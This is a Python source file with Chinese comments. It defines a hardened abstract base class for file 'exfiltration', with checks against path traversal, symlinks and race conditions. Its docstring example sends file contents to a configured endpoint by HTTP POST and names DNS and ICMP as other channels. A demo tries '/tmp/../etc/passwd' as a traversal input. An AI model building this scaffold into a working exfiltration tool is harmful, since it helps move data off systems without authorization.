"""
安全的文件外泄基类 - 生产级实现
防御路径遍历、符号链接、TOCTOU等攻击
"""

import os
import errno
import logging
from abc import ABC, abstractmethod
from pathlib import Path
from typing import Optional, Tuple
from dataclasses import dataclass

logger = logging.getLogger(__name__)


@dataclass
class ExfilResult:
    """外泄结果"""
    success: bool
    channel: str
    data: Optional[bytes] = None
    error: Optional[str] = None
    size: int = 0


class SecureFileExfiltrator(ABC):
    """
    安全的文件外泄器 (抽象基类)

    这是一个抽象基类，子类必须实现 exfiltrate() 方法来定义具体的外泄逻辑。

    安全特性:
    1. 路径遍历防御 (检查 .. 和规范化)
    2. 符号链接防御 (O_NOFOLLOW + 父目录检查)
    3. TOCTOU防御 (文件描述符操作)
    4. 白名单限制 (可选)
    5. 信息泄露防护 (通用错误消息)

    Usage:
        class HTTPExfiltrator(SecureFileExfiltrator):
            def exfiltrate(self, data: bytes) -> ExfilResult:
                # 实现具体的 HTTP 外泄逻辑
                return ExfilResult(success=True, channel=self.channel, data=data, size=len(data))

        config = Config(channel='http', allowed_base_path='/tmp')
        exfiltrator = HTTPExfiltrator(config)
        result = exfiltrator.exfiltrate_file('/tmp/test.txt')
    """

    def __init__(self, config):
        self.config = config
        self.channel = getattr(config, 'channel', 'unknown')
        self._validate_config()

    def _validate_config(self):
        """验证配置"""
        if hasattr(self.config, 'allowed_base_path') and self.config.allowed_base_path:
            try:
                allowed_base = Path(self.config.allowed_base_path).resolve(strict=True)
                if not allowed_base.is_dir():
                    raise ValueError("allowed_base_path must be a directory")
                self._allowed_base = allowed_base
            except (OSError, ValueError) as e:
                logger.error(f"Invalid allowed_base_path: {e}")
                raise ValueError("Configuration error: invalid allowed_base_path")
        else:
            self._allowed_base = None

    def _is_within_allowed_base(self, path: Path) -> bool:
        """
        检查路径是否在允许的基础目录内 (跨版本兼容)

        Args:
            path: 要检查的路径

        Returns:
            True if path is within allowed base, False otherwise
        """
        if self._allowed_base is None:
            return True  # 未配置白名单，允许所有路径

        try:
            # Python 3.9+
            return path.is_relative_to(self._allowed_base)
        except AttributeError:
            # Python 3.8 兼容
            try:
                path.relative_to(self._allowed_base)
                return True
            except ValueError:
                return False

    def _check_symlink_in_path(self, path: Path) -> bool:
        """
        检查路径或其父目录中是否包含符号链接

        Args:
            path: 要检查的路径

        Returns:
            True if symlink found, False otherwise
        """
        # 检查路径本身
        if path.exists() and path.is_symlink():
            return True

        # 检查所有父目录
        for parent in path.parents:
            if parent.exists() and parent.is_symlink():
                return True

        return False

    def _is_path_traversal(self, file_path: str, resolved_path: Path) -> bool:
        """
        检测路径遍历攻击

        Args:
            file_path: 原始文件路径
            resolved_path: 解析后的路径

        Returns:
            True if path traversal detected, False otherwise
        """
        # 检查是否包含 ..
        if '..' in Path(file_path).parts:
            return True

        # 检查规范化前后是否一致
        try:
            original_abs = Path(file_path).absolute()
            if original_abs != resolved_path:
                # 路径被规范化，可能包含 .. 或符号链接
                return True
        except Exception:
            return True

        return False

    def _validate_file_path(self, file_path: str) -> Tuple[Optional[Path], Optional[str]]:
        """
        集中验证文件路径安全性

        Args:
            file_path: 要验证的文件路径

        Returns:
            (resolved_path, error_message)
            如果验证失败，返回 (None, error_message)
        """
        try:
            original_path = Path(file_path)

            # 1. 检查符号链接 (在 resolve 之前)
            if self._check_symlink_in_path(original_path):
                logger.warning(f"Symlink detected in path: {file_path}")
                return None, "Access denied"

            # 2. 解析为绝对路径 (strict=False 允许路径不存在)
            try:
                resolved_path = original_path.resolve(strict=False)
            except (OSError, RuntimeError) as e:
                logger.warning(f"Path resolution failed: {file_path}, error: {e}")
                return None, "Access denied"

            # 3. 检查路径遍历
            if self._is_path_traversal(file_path, resolved_path):
                logger.warning(f"Path traversal detected: {file_path}")
                return None, "Access denied"

            # 4. 白名单检查
            if not self._is_within_allowed_base(resolved_path):
                logger.warning(
                    f"Path outside allowed directory: {file_path}, "
                    f"allowed_base: {self._allowed_base}"
                )
                return None, "Access denied"

            return resolved_path, None

        except Exception as e:
            logger.error(f"Path validation failed: {file_path}, error: {e}")
            return None, "Access denied"

    def _read_file_safe(self, path: Path) -> bytes:
        """
        安全读取文件，防止 TOCTOU 和符号链接攻击

        使用 O_NOFOLLOW 标志确保不会跟随符号链接
        使用文件描述符操作减少 TOCTOU 窗口

        Args:
            path: 要读取的文件路径

        Returns:
            文件内容

        Raises:
            ValueError: 如果是符号链接
            FileNotFoundError: 如果文件不存在
            PermissionError: 如果没有权限
            IsADirectoryError: 如果是目录
            OSError: 其他文件系统错误
        """
        try:
            # O_NOFOLLOW: 如果是符号链接则失败
            # O_RDONLY: 只读模式
            flags = os.O_RDONLY
            if hasattr(os, 'O_NOFOLLOW'):
                flags |= os.O_NOFOLLOW  # Windows 可能不支持

            fd = os.open(str(path), flags)
            try:
                # 使用 fstat 检查是否为普通文件
                stat_info = os.fstat(fd)
                import stat as stat_module
                if not stat_module.S_ISREG(stat_info.st_mode):
                    raise IsADirectoryError(f"Not a regular file: {path}")

                # 读取文件内容
                with os.fdopen(fd, 'rb') as f:
                    return f.read()
            except (OSError, IOError, IsADirectoryError, MemoryError) as e:
                os.close(fd)
                logger.debug(f"文件读取失败: {path}, 错误: {e}")
                raise

        except OSError as e:
            if e.errno == errno.ELOOP:
                raise ValueError("Symlink not allowed")
            elif e.errno == errno.ENOENT:
                raise FileNotFoundError(f"File not found: {path}")
            elif e.errno == errno.EACCES:
                raise PermissionError(f"Permission denied: {path}")
            elif e.errno == errno.EISDIR:
                raise IsADirectoryError(f"Is a directory: {path}")
            else:
                raise

    def exfiltrate_file(self, file_path: str) -> ExfilResult:
        """
        外泄文件 (生产级安全实现)

        Args:
            file_path: 文件路径

        Returns:
            ExfilResult
        """
        # 1. 验证路径安全性
        validated_path, error = self._validate_file_path(file_path)
        if error:
            return ExfilResult(
                success=False,
                channel=self.channel,
                error=error
            )

        # 2. 安全读取文件
        try:
            data = self._read_file_safe(validated_path)

            # 3. 执行外泄操作
            return self.exfiltrate(data)

        except (FileNotFoundError, PermissionError, IsADirectoryError, ValueError) as e:
            # 预期的错误，记录警告
            logger.warning(f"File access failed: {validated_path}, error: {type(e).__name__}")
            return ExfilResult(
                success=False,
                channel=self.channel,
                error="Access denied"  # 不泄露具体原因
            )
        except OSError as e:
            # 文件系统错误
            logger.error(f"File operation failed: {validated_path}, error: {e}")
            return ExfilResult(
                success=False,
                channel=self.channel,
                error="File operation failed"
            )
        except Exception as e:
            # 未预期的错误
            logger.exception(f"Unexpected error during file exfiltration: {validated_path}")
            return ExfilResult(
                success=False,
                channel=self.channel,
                error="Internal error"
            )

    @abstractmethod
    def exfiltrate(self, data: bytes) -> ExfilResult:
        """
        执行实际的外泄操作 (抽象方法，子类必须实现)

        此方法定义了数据外泄的核心逻辑，子类需要根据具体的外泄通道
        (如 HTTP、DNS、ICMP 等) 实现相应的传输机制。

        Args:
            data: 要外泄的原始数据 (bytes)

        Returns:
            ExfilResult: 外泄结果对象，包含以下字段:
                - success (bool): 外泄是否成功
                - channel (str): 使用的外泄通道名称
                - data (Optional[bytes]): 外泄的数据 (可选)
                - error (Optional[str]): 错误信息 (失败时)
                - size (int): 外泄数据的大小

        Raises:
            此方法不应抛出异常，所有错误应通过 ExfilResult.error 返回

        Example:
            class HTTPExfiltrator(SecureFileExfiltrator):
                def exfiltrate(self, data: bytes) -> ExfilResult:
                    try:
                        # 实现 HTTP POST 外泄
                        response = requests.post(self.config.endpoint, data=data)
                        return ExfilResult(
                            success=response.ok,
                            channel=self.channel,
                            data=data,
                            size=len(data)
                        )
                    except Exception as e:
                        return ExfilResult(
                            success=False,
                            channel=self.channel,
                            error=str(e)
                        )
        """
        pass


# 使用示例
if __name__ == "__main__":
    from dataclasses import dataclass

    @dataclass
    class Config:
        channel: str = "http"
        allowed_base_path: str = "/tmp"

    class HTTPExfiltrator(SecureFileExfiltrator):
        def exfiltrate(self, data: bytes) -> ExfilResult:
            # 实现 HTTP 外泄逻辑
            return ExfilResult(
                success=True,
                channel=self.channel,
                data=data,
                size=len(data)
            )

    # 测试
    config = Config()
    exfiltrator = HTTPExfiltrator(config)

    # 正常文件
    result = exfiltrator.exfiltrate_file("/tmp/test.txt")
    print(f"Result: {result}")

    # 路径遍历攻击
    result = exfiltrator.exfiltrate_file("/tmp/../etc/passwd")
    print(f"Result: {result}")
